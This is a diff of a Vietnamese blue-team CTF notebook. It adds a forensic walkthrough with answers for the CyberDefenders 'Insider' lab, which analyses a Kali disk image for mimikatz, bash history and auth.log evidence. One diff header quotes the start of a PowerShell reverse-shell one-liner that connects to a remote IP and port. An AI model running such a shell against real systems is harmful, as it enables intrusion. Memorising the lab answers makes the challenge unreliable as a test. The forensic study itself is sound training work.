@@ -1425,7 +1425,7 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);$stream
 ### II. 
 
 ## D. CyberDefenders:
-### HireMe Lab:
+### I. HireMe Lab:
 > - [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/hireme/)
 > - Đề cho file `.zip` chứa `.ad1` và `.txt` của nó nên ta dùng FTK Imager để phân tích. Vào `File`>`Add Evidence Item...`>`Image File`>`Next >`>`Browser`, chọn `.ad1` và `Finish`.
 
@@ -1726,6 +1726,77 @@ Chú ý phần `/tn` nghĩa là Task Name.
 ![image](https://hackmd.io/_uploads/BkeiYb58Zg.png)
 
 **$\rightarrow$ Đáp án: `bluesky`**
+
+### IV. Insider Lab:
+> Analyze Linux disk image artifacts, including logs and Bash history, using FTK Imager to investigate insider threat activities and reconstruct user actions.
+- [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/insider/)
+- Đề bài: *"After Karen started working for 'TAAUSAI,' she began doing illegal activities inside the company. 'TAAUSAI' hired you as a soc analyst to kick off an investigation on this case. You acquired a disk image and found that Karen uses Linux OS on her machine. Analyze the disk image of Karen's computer and answer the provided questions."*
+- Đề cho file `.zip` chứa `FirstHack.ad1` và `FirstHack.ad1.txt`.
+![image](https://hackmd.io/_uploads/BJAwY0GqZx.png)
+
+#### 1. Which Linux distribution is being used on this machine?
+- `/boot`: Chứa nhân Linux để khởi động, các file liên quan đến trình khởi động và các file system maps cũng như các file khởi động giai đoạn hai.
+- Vào `[root]/boot`:
+![image](https://hackmd.io/_uploads/BJSsaCMqWl.png)
+
+**$\rightarrow$ Đáp án: `kali`**
+
+#### 2. What is the MD5 hash of the Apache `access.log` file?
+Apache `access.log` file nằm ở `/[root]/var/log/apache2`. Chuột phải vào file, chọn `Export File Hash List...`:
+![image](https://hackmd.io/_uploads/Bkl3JkXcWl.png)
+![image](https://hackmd.io/_uploads/Hyb0yJmq-x.png)
+
+**$\rightarrow$ Đáp án: `d41d8cd98f00b204e9800998ecf8427e`**
+
+#### 3. It is suspected that a credential dumping tool was downloaded. What is the name of the downloaded file?
+Check thư mục `/[root]/root/Downloads`:
+![image](https://hackmd.io/_uploads/rytl-175bl.png)
+**$\rightarrow$ Đáp án: `mimikatz_trunk.zip`**
+
+#### 4. A super-secret file was created. What is the absolute path to this file?
+Trong `[root]/root/.bash_history`:
+![image](https://hackmd.io/_uploads/SJ6gDJmcZx.png)
+**$\rightarrow$ Đáp án: `/root/Desktop/SuperSecretFile.txt`**
+
+#### 5. What program used the file `didyouthinkwedmakeiteasy.jpg` during its execution?
+Lướt đến cuối `.bash_history`:
+![image](https://hackmd.io/_uploads/S11XdyQqWl.png)
+**$\rightarrow$ Đáp án: `binwalk`**
+
+#### 6. What is the third goal from the checklist Karen created
+- Check thư mục `/[root]/root/Desktop`:
+![image](https://hackmd.io/_uploads/SJqyKyQqZx.png)
+- Bấm chuột vào `Checklist` thì ta có được nội dung sau:
+![image](https://hackmd.io/_uploads/Hk6lt1Qq-l.png)
+
+**$\rightarrow$ Đáp án: `Profit`**
+
+#### 7. How many times was Apache run?
+Quay lại với `/[root]/var/log/apache2`, ta thấy cả ba file đều trống, chứng tỏ nó chưa chạy:
+![image](https://hackmd.io/_uploads/rkHBqy7cWg.png)
+**$\rightarrow$ Đáp án: `0`**
+
+#### 8. This machine was used to launch an attack on another. Which file contains the evidence for this
+Check thư mục `/[root]/root/`, ta thấy có một bức ảnh chụp lại command cho thấy User đang là Bob:
+![image](https://hackmd.io/_uploads/rJsy0yX9Wx.png)
+![ftk_b4384b97-cbdb-4e2a-8a4b-f5992c15564f](https://hackmd.io/_uploads/SkMra17qWx.jpg)
+**$\rightarrow$ Đáp án: `irZLAohL.jpeg`**
+
+#### 9. It is believed that Karen was taunting a fellow computer expert through a bash script within the Documents directory. Who was the expert that Karen was taunting?
+Trong `/[root]/root/Documents/myfirsthack/firstscript_fixed`:
+![image](https://hackmd.io/_uploads/HJsLglm5-g.png)
+**$\rightarrow$ Đáp án: `Young`**
+
+#### 10. A user executed the su command to gain root access multiple times at 11:26. Who was the user?
+Vào `/[root]/var/log/` lục tìm trong các log có dấu thời gian `11:26`. Ở `/auth.log`:
+![image](https://hackmd.io/_uploads/ByOkHxXc-l.png)
+![image](https://hackmd.io/_uploads/ByGZBxXcZg.png)
+**$\rightarrow$ Đáp án: `postgres`**
+
+#### 11. Based on the bash history, what is the current working directory?
+Quay lại với `.bash_history`:
+![image](https://hackmd.io/_uploads/rJVm8l7cZl.png)
+**$\rightarrow$ Đáp án: `/root/Documents/myfirsthack/`**
 
 ## E. Hack The Box:
 ### 1. Packet Puzzle:
